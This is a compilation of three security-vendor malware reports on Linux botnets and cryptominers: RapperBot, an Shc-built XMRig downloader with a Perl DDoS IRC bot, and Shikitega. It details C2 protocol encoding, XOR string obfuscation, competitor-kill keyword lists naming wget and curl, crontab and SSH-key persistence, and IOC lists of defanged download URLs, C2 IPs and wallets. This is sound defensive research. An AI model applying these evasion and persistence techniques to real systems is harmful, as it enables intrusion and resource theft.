+Affected Platforms: Linux
+Impacted Users: Any organization
+Impact: Remote attackers gain control of the vulnerable systems
+Severity Level: Critical
+FortiGuard Labs has encountered new samples of the RapperBot campaign active since January 2023. RapperBot is
+a malware family primarily targeting IoT devices. It has been observed in the wild since June 2022. FortiGuard Labs
+reported on its previous campaigns in August 2022 and December 2022. Those campaigns focused on brute-forcing
+devices with weak or default SSH or Telnet credentials to expand the botnet’s footprint for launching Distributed
+Denial of Service (DDoS) attacks.
+In this campaign, these threat actors have started venturing into cryptojacking, specifically for Intel x64 machines.
+Initially, they deployed and executed a separate Monero cryptominer alongside the usual RapperBot binary. But in
+late January 2023, they combined both functionalities into a single bot.
+This article will discuss the changes observed in this new campaign and provide a technical analysis of the
+RapperBot variant upgraded with miner capabilities.
+Same But Different
+We began observing the first samples of this RapperBot miner campaign in January 2023. They share some
+characteristics that allowed us to link this campaign to the earlier ones.
+The most unique and enduring trait of RapperBot samples is the YouTube URL https://www.youtube.com/watch?
+v=4fm_ZZn5qaw, which has been seen in most samples from this family. However, the string is never actually used in
+this campaign, unlike older samples where it prints the URL to the console at the start of execution.
+Another indicator of a RapperBot campaign is adding an SSH public key to ~/.ssh/authorized_keys to maintain
+backdoor access to infected machines, even after the devices have been rebooted. This latest campaign uses the
+same key observed in the first campaign in June 2022 and is listed in the IOC section below.
+Beyond these similarities, however, we also observed some key differences, including several significant updates to
+the malware functionality, particularly in its C2 communication protocol.
+One cluster of ARM samples, such as 7c9e6d63bc1f26e9c8a8703439e12de12da9892f2d6cd9bda5f45ec00c98a29f
+(Cluster A) that were delivered via hxxp://109[.]206[.]243[.]207/ssh/arm7, were very minimal in functionality. They only
+1/8
+included three DoS attack types and no SSH brute forcing or self-propagation abilities. However, these samples
+included new code to collect and send information about the infected system upon registering with the C2 server.
+Another cluster of ARM samples delivered from the same URL, such as
+912e151641f20f9d689c6ea26cf6f11d5ee0b6fdc4d4a1179fac413391748c65 (Cluster B), resembles the above
+samples but with the inclusion of the SSH brute-forcer last seen in the June 2022 campaign. Unlike that campaign,
+credentials are embedded in each sample and not downloaded from the C2 server. These samples propagate
+themselves by downloading and executing hxxp://109[.]206[.]243[.]207/d upon the successful brute force breach of a
+system.
+As in past campaigns, all samples from this campaign still encode sensitive strings with XOR encoding. But this time,
+the developers have opted to add an extra layer of XOR encoding, with the first layer using multi-byte XOR keys with
+different values and lengths for each encoded string. The second layer uses the same style of single-byte XOR
+encoding as in previous campaigns, with the key calculated by XORing all bytes of the first layer key (Figure 1). This
+additional layer of XOR encoding prevents XOR brute forcing and the easy detection of malware-related strings.
+The original draft was worded ambiguously, we meant to say that this campaign embedded the credentials in each
+sample. In the previous campaign, the credentials were downloaded from the C2 server.
+The structure of client requests to the Command-and-Control (C2) server has also been significantly updated. The
+unique 32-byte Bot ID sent with every request in previous campaigns has been removed. Instead, the request size is
+now variable, with random bytes generated to fill the unused parts of the request. Lastly, the request data is no longer
+located at fixed offsets within each request. We describe the communication protocol and request structure in more
+detail below.
+ Figure 1: XOR string decoding
+Revamped C2 Communication Protocol
+Upon execution, RapperBot connects to a hardcoded C2 server and sends a registration request (type 1) containing
+information about the victim system (Figure 2):
+1.     Hardcoded value: 0x3 0xd3 0x4a 0xb6
+2.     Source: This is the first command line argument passed to the malware and usually indicates the infection vector
+(e.g., scan.ssh.x86_64)
+3.     Local IP address
+4.     UID (User identifier)
+5.     Current working directory
+6.     Number of processors
+7.     Total memory size
+8.     Open File Limit
+9.     Hostname
+10.  Processor model
+2/8
+registration request
+ Figure 2: System info sent in the
+After that, it sends a keep-alive request (type 3) to inform the C2 server that it is ready to receive commands. The
+malware then performs this request at random intervals of 60 to 600 seconds.
+To evade detection, the binary network protocol used to send these requests has been completely revised. Like its
+string encoding, it uses a two-layer approach to encode the information sent to the C2 server. The header data must
+first be decoded to reveal the location of the encoded information and the key needed to decode it.
+The size of each request is randomized, so shorter requests do not stand out in network traffic. The malware starts by
+generating a random number between 4 and 128, which we will refer to as RAND_VALUE, and a random XOR key
+for the content from 4 to 32 bytes long (referred to as KEY_SIZE).
+The request size is then calculated as follows:
+REQUEST_SIZE = RAND_VALUE + KEY_SIZE + CONTENT_SIZE + 6
+The malware then generates a buffer of the same size and fills it with random bytes. The first byte of this buffer will be
+used as a XOR key (HEADER_KEY) for encoding the header data. The second byte will be overwritten with the
+RAND_VALUE XORed with the HEADER_KEY.
+The request data is stored at HEADER_OFFSET, RAND_VALUE / 2.
+The format of the structure starting at HEADER_OFFSET is as follows:
+Offset 0x2: ENC_REQ_TYPE (Request type xor HEADER_KEY)
+Offset 0x3: ENC_KEY_SIZE (KEY_SIZE xor HEADER_KEY)
+Offset 0x4: Start of KEY
+Offset KEY_SIZE + 0x4: ENC_CODE_SIZE ((little endian word containing CONTENT_SIZE rol 8 xor
+HEADER_KEY)
+Offset KEY_SIZE + 0x6: Start of encoded content (ENC_CONTENT)
+request
+ Figure 3: Encoded registration
+All non-highlighted bytes in Figure 3 are unused padding bytes generated randomly by the malware. The Python
+code used to decode the content in each request with the HEADER_KEY and KEY is shown below:
+3/8
+While we did not receive commands from the C2 server, our analysis shows that the bot supports the following
+commands with their corresponding IDs.
+4: Perform DDoS attacks (UDP, TCP, and HTTP GET)
+5: Stop DDoS attacks
+6: Terminate itself (and any child processes)
+Expanding into Cryptojacking
+The change in the C2 communication protocol is not the only major update in this campaign. Until now, RapperBot
+has been primarily geared toward using its victims for DDoS operations. For this campaign, however, it has started to
+venture into abusing the resources of infected Intel x64 machines to mine for cryptocurrency, commonly known as
+Cryptojacking.
+We observed that hxxp://109[.]206[.]243[.]207/ssh/x86_64 started serving Bash shell scripts instead of the usual
+RapperBot binary for the x64 architecture as early as January 12. These Bash scripts (example hash:
+7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f) downloaded and executed separate
+XMRig crypto miners (example hash: 0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404)
+and RapperBot binaries, as seen in Figure 4.
+bot and miner
+ Figure 4: Bash script delivers
+XMRig is an open-source Monero miner commonly abused by threat actors for cryptojacking. Monero (XMR) is a
+popular cryptocurrency for illicit mining by threat actors because of its privacy-enhancing features. It is also designed
+to be more resistant to application-specific integrated circuit (ASIC) miners, which makes it possible to mine profitably
+with just consumer-grade hardware.
+In late Jan 2023, FortiGuard Labs collected a significantly larger x64 sample
+f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa, which used the same C2 server IP
+4/8
+and communication protocol. On further analysis, we verified that the bot developers had merged the RapperBot C
+source code with the C++ code of XMRig Monero miner to create a combined bot client with mining capabilities.
+Mining Under the Radar
+Apart from executing the miner as a child process upon execution, these samples are functionally identical to those
+targeting ARM devices and do not have SSH brute-forcing or self-replication capabilities. Merging the bot and miner
+code might be an attempt to hide the mining pools and Monero wallet addresses (listed in the IOCs section) using the
+same double-layer XOR encoding so they are not exposed in the clear, as in the Bash script (Figure 4).
+The miner code also contains several modifications to facilitate cryptojacking.
+The ability to read external configuration files has been removed, so it always uses the configuration built into the
+binary itself. The bot decodes the mining pools and Monero wallet addresses and updates the hardcoded
+configuration before starting the embedded miner.
+The miner is also configured to use multiple mining pools for both redundancy and additional privacy. Two of them are
+mining proxies hosted on the RapperBot C2 IP itself. This allows the threat actor to omit both the wallet addresses
+and actual mining pools from the miner configuration. Additionally, they can change this information on the proxy
+server without rebuilding and deploying new bots. Aside from this, it is also configured to directly use a public mining
+pool, likely as a backup if the C2 IP goes offline.
+To prevent the termination of the miner process by the machine owner, the default signal handlers for SIGTERM,
+SIGUSR1, SIGINT, and SIGHUP signals have been removed.
+The usage information printed when executing the --help command line argument has also been removed, likely to
+evade detection by security products and competing miners from other cryptojacking groups. Likewise, the
+developers also replaced “XMRig" with “asbuasdbu" in the version information to prevent easy identification.
+To maximize mining efficiency, it kills off other miners by enumerating other running processes and attempts to scan
+the associated binaries on disk for the following blacklisted keywords. These processes are then terminated, and the
+corresponding files are deleted. For example, “--algo” in the list below is part of the usage information printed by
+standard XMRig miners.
+xmrig
+.rsync
+miner
+dota.
+moner
+UPX!
+--algo
+network01
+faster than light
+dota2
+.rsync
+cat /proc/cpuinfo
+/etc/cron.hourly/gcc.sh
+/etc/daemon.cfg
+denyip=
+If the binaries are not readable, it will look for blacklisted keywords within the file paths, terminate the processes, and
+delete the associated files.
+/shm/
+/dev/netslink/
+/tmp/
+xmrig
+.X19-unix
+netwalker
+(deleted)
+.rsync
+/a/
+/b/
+/c/
+miner
+dota
+network01
+xrx
+/.x
+5/8
+Lastly, it will terminate processes containing the blacklisted keywords in the process path or its command line
+arguments. Processes with path or command-line arguments containing “/zvx/” are whitelisted and never terminated.
+wget
+curl
+netstat
+kill
+3333
+zmap
+tsm
+passwd
+netwalk
+zzh
+xrx
+pnscan
+xri
+Based on the keywords used, the bot developers are more interested in terminating other miners than other IoT bots.
+This reaffirms their focus on cryptojacking vs DDoS attacks, at least on x64 machines.
+As a side note, we have not discovered an infection vector that directly delivers x64 RapperBot, as none of the
+RapperBot samples with an integrated miner appear to have self-propagation capabilities. This suggests the possible
+availability of an external loader operated by the threat actor that abuses the credentials collected by other RapperBot
+samples with brute forcing capabilities and infects only x64 machines with the combined bot/miner.
+Alternatively, the addition of the threat actor’s public SSH key in infected machines might provide another point of
+entry for these x64 samples.
+Conclusion
+Financially motivated botnet operators are always on the lookout to extract the maximum value from machines
+infected by their botnets. The threat actors behind the RapperBot botnet are no exception, as evident in their addition
+of cryptojacking capabilities to target x64 machines.
+RapperBot continues to be a dangerous threat due to its continual updates to evade detection, as highlighted above.
+As its primary infection vector of compromising SSH services using weak or default passwords remains the same,
+mitigating it by enabling public key authentication or setting strong passwords for all devices connected to the internet
+is still effective in mitigating this threat.
+FortiGuard Labs will continue to monitor and report on RapperBot’s development.
+Fortinet Protections 
+Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail,
+FortiClient, and FortiEDR services, as follows:
+The following (AV) signature detects the malware samples mentioned in this blog:
+ELF/Mirai.VI!tr
+ELF/RapperBot.FGLT!tr
+Linux/RapperBot.FGLT!tr.dldr
+Linux/RapperBot.FGLTA!tr.dldr
+Adware/Miner
+Riskware/CoinMiner
+The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP
+customers running current AntiVirus updates are also protected.
+The FortiGuard Web Filtering Service blocks the C2 servers and download URLs.
+The FortiGuard IP Reputation and Anti-Botnet Security Service proactively blocks these attacks by aggregating
+malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative
+competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.
+If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global
+FortiGuard Incident Response Team.
+6/8
+IOCs
+Files
+RapperBot
+7c9e6d63bc1f26e9c8a8703439e12de12da9892f2d6cd9bda5f45ec00c98a29f
+912e151641f20f9d689c6ea26cf6f11d5ee0b6fdc4d4a1179fac413391748c65
+f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa
+6c034ff9b5447da62822e3231e5e2d5db225756b3e216f6fc469469cb1d81813
+dfaffe78b8ccb03626c2f55596f977da917e8e9a00ee7576ce9eca688d88447d
+95aa6882f5ea5a892ef832ef15dea77261394a7fec6db9d91267d40f1cf2bfa5
+XMRig miner
+0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404
+Bash scripts
+bd87ac780e574ae8415907f88a3b48af578bb269308b56826e2f33438559e4b7
+3296598c79748322dfff8eb786705d048725c04b23dd3a293f52a1acafe9e7ae
+7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f 
+Download URLs
+hxxp://109[.]206[.]243[.]207/d
+hxxp://109[.]206[.]243[.]207/ssh/arm4
+hxxp://109[.]206[.]243[.]207/ssh/arm5
+hxxp://109[.]206[.]243[.]207/ssh/arm6
+hxxp://109[.]206[.]243[.]207/ssh/arm7
+hxxp://109[.]206[.]243[.]207/ssh/bot
+hxxp://109[.]206[.]243[.]207/ssh/scan_arm4
+hxxp://109[.]206[.]243[.]207/ssh/scan_arm5
+hxxp://109[.]206[.]243[.]207/ssh/scan_arm6
+hxxp://109[.]206[.]243[.]207/ssh/scan_arm7
+hxxp://109[.]206[.]243[.]207/ssh/x86_64
+hxxp://109[.]206[.]243[.]207/ssh/xmrig
+hxxp://171[.]22[.]136[.]15/arm4
+hxxp://171[.]22[.]136[.]15/arm5
+hxxp://171[.]22[.]136[.]15/arm6
+hxxp://171[.]22[.]136[.]15/arm7
+C2s
+109[.]206[.]243[.]207
+171[.]22[.]136[.]15
+Mining Pools
+109[.]206[.]243[.]207:31271
+109[.]206[.]243[.]207:25621
+pool[.]hashvault[.]pro:80
+Monero Wallets
+7/8
+43Zs6jyniktVUNfiN8NY16TrvFKWbx3qogoRvstuquZdVA8EXvhqhz1W4hUzpjQXHAf3pDQ8UXxegFh8G26uCycKPz41ceW
+47RupsxSjeHb4sHMwJ681vbjpFHAwXg6kMn1znbioqy96Qj9j2VuHrD2mXsEReELEdjRsDVKBK3Ru3diW3AgZ41Z7mzDwb4
+SSH Key
+AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPem
+system key generated by server 20220709
+8/8
+asec.ahnlab.com /en/45182/
+Shc Linux Malware Installing CoinMiner
+⋮ 2023/1/4
+The ASEC analysis team recently discovered that a Linux malware developed with Shc has been installing a
+CoinMiner. It is presumed that after successful authentication through a dictionary attack on inadequately managed
+Linux SSH servers, various malware were installed on the target system. Among those installed were the Shc
+downloader, XMRig CoinMiner installed through the former, and DDoS IRC Bot, developed with Perl.
+1. Shc (Shell Script Compiler)
+Shc is an abbreviation for Shell Script Compiler and is responsible for converting Bash shell scripts into an ELF
+(Executable and Linkable Format).
+Figure 1. Overview of General Shell Script Compiler
+Bash is a basic shell offered in the Linux operating system, and commands supported by the Bash shell can be
+compiled in script format. This means that the commands to be executed by users can be written as scripts, and
+1/7
+because of this, syntaxes such as conditional and looping statements are provided. The Bash shell can be compared
+to the Command Prompt in Windows, with the Bash shell script files corresponding to Windows batch scripts.
+Additionally, just like how Linux has Shc that converts Bash shell scripts into executable ELF file formats, Windows
+has the bat2exe utility that converts batch scripts into executable EXE file formats. In Windows environments, threat
+actors use bat2exe to convert malicious batch scripts to executables before distributing them in order to bypass file
+detection of security software such as anti-malware products. It is likely that the reason threat actors do not distribute
+the bash shell scripts as is but rather convert them to ELF before distributing them is to evade file detection as they
+do in Windows environments.
+The Shc data section contains the original Bash shell script encoded with the Alleged RC4 algorithm. When it is
+executed afterward, the same ARC4 algorithm is used to decode the original script, and the decoded script
+commands are executed.
+Figure 2. Decoding routine using the ARC4 algorithm
+2. Shc Downloader
+The following is a decoded Bash shell script of Shc malware reported by a client company that suffered an infiltration
+attack. It downloads and runs files from external sources, and based on the fact that XMRig CoinMiner is downloaded
+and installed from the currently available address, it is assumed to be a CoinMiner downloader..
+Figure 3. A portion of the decoded Bash shell script’s routine
+Additionally, this malware has the characteristic of infecting systems alongside DDoS IRC Bot malware developed
+with Perl, and this point will be discussed in more detail further on. These DDoS IRC Bots have been continuously
+installed during the past years on Linux servers with inappropriate account information and still continued to this day.
+The threat actors attempt dictionary attacks on SSH servers after a scanning process, and if this process is
+2/7
+successful, various malware such as Perl IRC Bot is installed on the target system. Other malware include XMRig,
+SSH Scanner and various IRC Bot malware.
+Analysis of the reported malware revealed that a “run” file for execution didn’t exist and instead required multiple
+arguments, which limits our analysis with this sample only.
+Feature
+Argument #
+1
+2
+3
+4
+5
+6
+7
+Table 1. Arguments needed for execution
+The download URL and the name of the file to be downloaded
+Version (The “universal” string by default)
+The name of the PID file to be created
+The Socks5 host name
+The path where the installation process will occur (“/Usr/local/games/” by default)
+Additional download URLs
+Additional commands
+While the ASEC analysis team was tracking related malware, the team found a similar form of Shc Downloader
+Malware uploaded on VirusTotal. Assuming that such types of malware were all uploaded to VirusTotal from Korea, it
+seems that attacks generally target systems in Korea.
+The malware found on VirusTotal has a much simpler structure in comparison to the type covered above, requiring no
+additional arguments and having a complete URL as the download address.
+Figure 4. Bash shell script extracted from the similar file
+3. XMRig CoinMiner
+The Shc downloader malware is responsible for downloading a compressed file from an external source to the path,
+“/usr/local/games/” and executing the “run” file. The compressed file currently available for download includes not only
+the XMRig CoinMiner malware but also a config.json with the mining pool URL and the “run” script.
+Figure 5. Downloaded compressed file
+3/7
+Figure 6. config.json file
+As the config.json file containing the configuration data exists in the same path, the configuration does not need to be
+transmitted when XMRig is executed. However, examining the “run” script shown below reveals that it transmits
+slightly different configuration data to config.json before executing XMRig.
+Figure 7. The “run” script that executes XMRig
+4. DDoS IRC Bot
+Aside from installing a CoinMiner on the infected system, the threat actor installs an IRC bot that can perform a DDoS
+attack by receiving commands. This DDoS IRC Bot has the characteristic of being developed with Perl, and as the
+name suggests, it uses the IRC protocol in communications with the C&C server.
+Both malware strains are similar in form, and while one of them currently cannot connect to the C&C server (IRC
+server), the other can. Even if a connection can be established, entering the channel is unavailable, and this is
+presumed to be because the password has been changed from “ddosit” to another value. Additionally, a URL is
+included in the message that is displayed after channel entry is denied. A compressed file can be downloaded from
+this URL, and this file contains XMRig from above.
+4/7
+Figure 8. The process of connecting to the IRC server and attempting to enter the channel
+Next is the configuration data which includes the IRC server address, port number, “#xmr” (IRC channel name to
+enter), and the password “@” required for entry into the channel. For reference, DDoS IRC Bot performs additional
+tasks to verify the threat actor; the username of the user that entered the channel must be one of the four usernames
+shown below and the host address must be “qwerty”.
+Figure 9. Configuration data of DDoS Perl IRC Bot
+If the above conditions are met, it deems the user to be the threat actor and performs the received commands. This
+bot supports not only DDoS attacks such as TCP Flood, UDP Flood, and HTTP Flood but various other features
+including command execution, reverse shell, port scanning, and log deletion. The following is a screenshot taken not
+by the actual threat actor’s command but during a test process. It shows the process of DDoS IRC Bot sending the
+list of commands to the #xmr channel when the “!u @commands” command is entered to bring up the list of available
+commands.
+5/7
+Figure 10. Following commands transmitted from the IRC server
+Conclusion
+Typical attacks that target Linux SSH servers include brute force attacks and dictionary attacks on systems where
+account credentials are poorly managed. Because of this, administrators should use passwords that are difficult to
+guess for their accounts and change them periodically to protect the Linux server from brute force attacks and
+dictionary attacks, and update to the latest patch to prevent vulnerability attacks.
+Administrators should also use security programs such as firewalls for servers accessible from outside to restrict
+access by attackers. Finally, V3 should be updated to the latest version so that malware infection can be prevented.
+File Detection
+– Downloader/Linux.Agent.13360 (2022.12.21.00)
+– Downloader/Linux.Agent.13256 (2022.12.25.03)
+– Downloader/Linux.Agent.13392 (2022.12.25.03)
+– Shellbot/Perl.Generic.S1118 (2020.02.19.07)
+– Linux/CoinMiner.Gen2 (2019.07.31.08)
+– CoinMiner/Text.Config (2022.12.26.03)
+– Trojan/Shell.Agent.SC185400 (2022.12.26.03)
+– Trojan/Shell.Agent.SC185401 (2022.12.26.03)
+IOC
+MD5
+– c13e7e87e800a970df4d113d60e75ab4: Shc Downloader (kermine)
+– 1f0e5f4736a567a631946a0d9878fad7 : Shc Downloader (VirusTotal)
+– 6fa237ce385dc9495246bc4498b64c2d : Shc Downloader (VirusTotal)
+– 7650957bf7d798b284ea01a732ad07a5 : Perl DDoS IRC Bot (botcarternew)
+– 077279a2ae5b1bc89540a1293fa807f1 : Perl DDoS IRC Bot (.ubuntu)
+– 497bec45d865b2a9165699433c64816c : XMRig (s)
+– c1e65d481af4e6d4bad74cca4e8737cb : XMRig (xmrig)
+– 48e5ce77980d52c68a7bbfd091756036 : XMRig (.system3d)
+– 16b7ef9cbc89ccc08f5fcd80e473c169 : XMRig Configuration File (config.json)
+– a2fd0f3e18259d0bba9ebbf910e925c4 : XMRig Configuration File (config.json)
+– a2c7c9e3b468e7e02e882066b05c55c3 : Launcher Script (run)
+– c15ed837bd367fd4f66562b57b8fb57c ” Launcher Script (.b4nd1d0)
+C&C URL
+– 64.227.112[.]247:80 – Perl DDoS IRC Bot
+– 157.230.116[.]194:80 – Perl DDoS IRC Bot
+Download URL
+– hxxp://172.105.211[.]21/
+– hxxp://172.105.211[.]21/xmrig
+– hxxp://172.105.211[.]21/snunewa.tar
+6/7
+– hxxp://167.172.103[.]111/
+– hxxp://172.104.170[.]240/
+– hxxp://172.104.170[.]240/snunewa.tar
+– hxxp://wget.hostname[.]help/
+– hxxp://wget.hostname[.]help/driver.zip
+– hxxp://pateu.freevar[.]com/xmrminer2.tgz
+Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and
+detailed analysis information.
+Categories:Malware Information
+Tagged as:DDOS,IRC,Linux,SHC
+7/7
+cybersecurity.att.com /blogs/labs-research/shikitega-new-stealthy-malware-targeting-linux
+Shikitega - New stealthy malware targeting Linux
+1. AT&T Cybersecurity
+2. Blog
+September 6, 2022  |  Ofer Caspi
+Executive summary
+AT&T Alien Labs has discovered a new malware targeting endpoints and IoT devices that are running Linux
+operating systems. Shikitega is delivered in a multistage infection chain where each module responds to a part
+of the payload and downloads and executes the next one. An attacker can gain full control of the system, in
+addition to the cryptocurrency miner that will be executed and set to persist.
+Key takeaways:
+The malware downloads and executes the Metasploit’s “Mettle” meterpreter to maximize its control on
+infected machines.
+Shikitega exploits system vulnerabilities to gain high privileges, persist and execute crypto miner.
+The malware uses a polymorphic encoder to make it more difficult to detect by anti-virus engines.
+Shikitega abuse legitimate cloud services to store some of its command and control servers (C&C).
+1/10
+Figure 1. Shikitega operation process.
+Background
+With a rise of nearly 650% in malware and ransomware for Linux this year, reaching an all-time high in the first
+half year of 2022, threat actors find servers, endpoints and IoT devices based on Linux operating systems more
+and more valuable and find new ways to deliver their malicious payloads. New malwares like BotenaGo and
+EnemyBot are examples of how malware writers rapidly incorporate  recently discovered vulnerabilities to find
+new victims and increase their reach.
+Shikitega uses an infection chain in multiple layers, where the first one contains only a few hundred bytes, and
+each module is responsible for a specific task, from downloading and executing Metasploit meterpreter,
+exploiting Linux vulnerabilities, setting persistence in the infected machine to downloading and executing a
+cryptominer.
+Analysis
+The main dropper of the malware is a very small ELF file, where its total size is around only 370 bytes, while its
+actual code size is around 300 bytes. (figure 2)
+2/10
+Figure 2. Malicious ELF file with a total of only 376 bytes.
+The malware uses the “Shikata Ga Nai” polymorphic XOR additive feedback encoder, which is one of the most
+popular encoders used in Metasploit. Using the encoder, the malware runs through several decode loops, where
+one loop decodes the next layer, until the final shellcode payload is decoded and executed. The encoder stud is
+generated based on dynamic instruction substitution and dynamic block ordering. In addition, registers are
+selected dynamically.  Below we can see how the encoder decrypts the first two loops: (figures 3 and 4)
+Figure 3. First “Shikata Ga Nai” decryption loop.
+3/10
+Figure 4. Second “Shikata Ga Nai” decryption loop created by the first one.
+After several decryption loops, the final payload shellcode will be decrypted and executed. As the malware does
+not use any imports, it uses ‘int 0x80’ to execute the appropriate syscall. As the main dropper code is very small,
+the malware will download and execute additional commands from its command and control by calling 102
+syscall (sys_socketcall). (Figure 5)
+Figure 5. Calling system functions using interrupts
+The C&C will respond with additional shell commands to execute, as seen in the packet capture in figure 6. The
+first bytes marked in blue are the shell commands that the malware will execute.
+4/10
+Figure 6. Additional commands received from C&C.
+The received command will download additional files from the server that won’t be stored in the hard drive, but
+rather will be executed from memory only. (Figure 7)
+Figure 7. Executes additional shell code received from C&C.
+In other malware versions, it will use the “execve” syscall to execute ‘/bin/sh’ with command received from the
+C&C. (figure 8)
+5/10
+Figure 8. Executing shell commands by using syscall_execve.
+The malware downloads and executes ‘Mettle’, a Metasploit meterpreter that allows the attacker to use a wide
+range of attacks from webcam control, sniffer, multiple reverse shells (tcp/http..), process control, execute shell
+commands and more. 
+In addition the malware will use wget to download and execute the next stage dropper.
+Next stage dropper
+The next downloaded and executed file is an additional small ELF file (around 1kb) encoded with the “Shikata
+Ga Nai” encoder. The malware decrypts a shell command that will be executed by calling syscall_execve with
+‘/bin/sh” as a parameter with the decrypted shell. (Figure 9)
+Figure 9. Second stage dropper decrypts and executes shell commands.
+6/10
+The executed shell command will download and execute additional files. To execute the next and last stage
+dropper, it will exploit two linux vulnerabilities to leverage privileges - CVE-2021-4034 and CVE-2021-3493
+(figure 10 and 11).
+Figure 10. Exploiting Linux vulnerability CVE-2021-3493.
+Figure 11. Exploiting CVE-2021-4034 vulnerability.
+The malware will leverage the exploit to download and execute the final stage with root privileges - persistence
+and cryptominer payload.
+Persistence
+To achieve persistence, the malware will download and execute a total of 5 shell scripts. It persists in the system
+by setting 4 crontabs, two for the current logged in user and the other two for the user root. It will first check if
+the crontab command exists on the machine, and if not, the malware will install it and start the crontab service.
+To make sure only one instance is running, it will use the flock command with a lock file “/var/tmp/vm.lock”.
+7/10
+Figure 12. Adding root crontab to execute the final payload.
+Below is the list of downloaded and executed script to achieve persistence:
+details
+script
+name
+unix.sh
+Check if “crontab” commands exist in the system, if not install it and start the crontab
+service.
+Adds crontab for current user to execute cryptominer.
+brict.sh
+politrict.sh Adds root crontab to execute cryptominer.
+truct.sh
+restrict.sh Adds root crontab to download cryptominer and config from C&C.
+Adds crontab for current user to download cryptominer and config from C&C.
+As the malware persists with crontabs, it will delete all downloaded files from the system to hide its presence.
+Cryptominer payload
+The malware downloads and executes XMRig miner, a popular miner for the Monero cryptocurrency. It will also
+set a crontab to download and execute the crypto miner and config from the C&C as mentioned in the
+persistence part above.
+Figure 13. XMRig miner is downloaded and executed on an infected machine.
+Command and control
+Shikitega uses cloud solutions to host some of its command and control servers (C&C) as shown by OTX in
+figure 14. As the malware in some cases contacts the command and control server using directly the IP without
+domain name, it’s difficult to provide a complete list of indicators for detections since they are volatile and they
+will be used for legitimate purposes in a short period of time.
+8/10
+Figure 14. Command and control server hosted on a legitimate cloud hosting service.
+Recommended actions
+1. Keep software up to date with security updates.
+2. Install Antivirus and/or EDR in all endpoints.
+3. Use a backup system to backup server files.
+Conclusion
+Threat actors continue to search for ways to deliver malware in new ways to stay under the radar and avoid
+detection. Shiketega malware is delivered in a sophisticated way, it uses a polymorphic encoder, and it gradually
+delivers its payload where each step reveals only part of the total payload. In addition, the malware abuses
+known hosting services to host its command and control servers. Stay safe!
+Associated Indicators (IOCs)
+The following technical indicators are associated with the reported intelligence. A list of indicators is also
+available in the OTX Pulse. Please note, the pulse may include other activities related but out of the scope of
+the report.
+TYPE
+INDICATOR
+DOMAIN dash[.]cloudflare.ovh
+DOMAIN main[.]cloudfronts.net
+DESCRIPTION
+Command and
+control
+Command and
+control
+SHA256 b9db845097bbf1d2e3b2c0a4a7ca93b0dc80a8c9e8dbbc3d09ef77590c13d331 Malware hash
+SHA256 0233dcf6417ab33b48e7b54878893800d268b9b6e5ca6ad852693174226e3bed Malware hash
+SHA256 f7f105c0c669771daa6b469de9f99596647759d9dd16d0620be90005992128eb Malware hash
+Malware hash
+SHA256 8462d0d14c4186978715ad5fa90cbb679c8ff7995bcefa6f9e11b16e5ad63732
+9/10
+SHA256 d318e9f2086c3cf2a258e275f9c63929b4560744a504ced68622b2e0b3f56374 Malware hash
+SHA256 fc97a8992fa2fe3fd98afddcd03f2fc8f1502dd679a32d1348a9ed5b208c4765
+Malware hash
+SHA256 e4a58509fea52a4917007b1cd1a87050b0109b50210c5d00e08ece1871af084d Malware hash
+SHA256 cbdd24ff70a363c1ec89708367e141ea2c141479cc4e3881dcd989eec859135d Malware hash
+SHA256 d5bd2b6b86ce14fbad5442a0211d4cb1d56b6c75f0b3d78ad8b8dd82483ff4f8
+Malware hash
+SHA256 29aafbfd93c96b37866a89841752f29b55badba386840355b682b1853efafcb8 Malware hash
+SHA256 4ed78c4e90ca692f05189b80ce150f6337d237aaa846e0adf7d8097fcebacfe7
+Malware hash
+SHA256 130888cb6930500cf65fc43522e2836d21529cab9291c8073873ad7a90c1fbc5 Malware hash
+SHA256 3ce8dfaedb3e87b2f0ad59e1c47b9b6791b99796d38edc3a72286f4b4e5dc098 Malware hash
+SHA256 6b514e9a30cbb4d6691dd0ebdeec73762a488884eb0f67f8594e07d356e3d275 Malware hash
+SHA256 7c70716a66db674e56f6e791fb73f6ce62ca1ddd8b8a51c74fc7a4ae6ad1b3ad Malware hash
+Malware hash
+CVE-2021-
+3493
+Malware hash
+CVE-2021-
+4034
+SHA256 2b305939d1069c7490b3539e2855ed7538c1a83eb2baca53e50e7ce1b3a165ab
+SHA256 4dcae1bddfc3e2cb98eae84e86fb58ec14ea6ef00778ac5974c4ec526d3da31f
+SHA256 59f0b03a9ccf8402e6392e07af29e2cfa1f08c0fc862825408dea6d00e3d91af
+SHA256 64a31abd82af27487985a0c0f47946295b125e6d128819d1cbd0f6b62a95d6c4
+SHA256 623e7ad399c10f0025fba333a170887d0107bead29b60b07f5e93d26c9124955
+SHA256 e8e90f02705ecec9e73e3016b8b8fe915873ed0add87923bf4840831f807a4b4 Malware hash
+Malware shell
+script
+Malware shell
+script
+Malware shell
+script
+Malware shell
+script
+Malware shell
+script
+Malware hash
+SHA256 05727581a43c61c5b71d959d0390d31985d7e3530c998194670a8d60e953e464
+SHA256 ea7d79f0ddb431684f63a901afc596af24898555200fc14cc2616e42ab95ea5d
+SHA256 9ca4fbfa2018fe334ca8f6519f1305c7fbe795af9eb62e9f58f09e858aab7338
+Mapped to MITRE ATT&CK
+The findings of this report are mapped to the following MITRE ATT&CK Matrix techniques:
+TA0002: Execution
+T1059: Command and Scripting Interpreter
+T1569: System Service
+T1569.002: Service Execution
+TA0003: Persistence
+T1543: Create or Modify System Process
+TA0005: Defense Evasion
+T1027: Obfuscated Files or Information
+Tags: malware research, otx, shikitega
+10/10
+2023/1/9 15:59
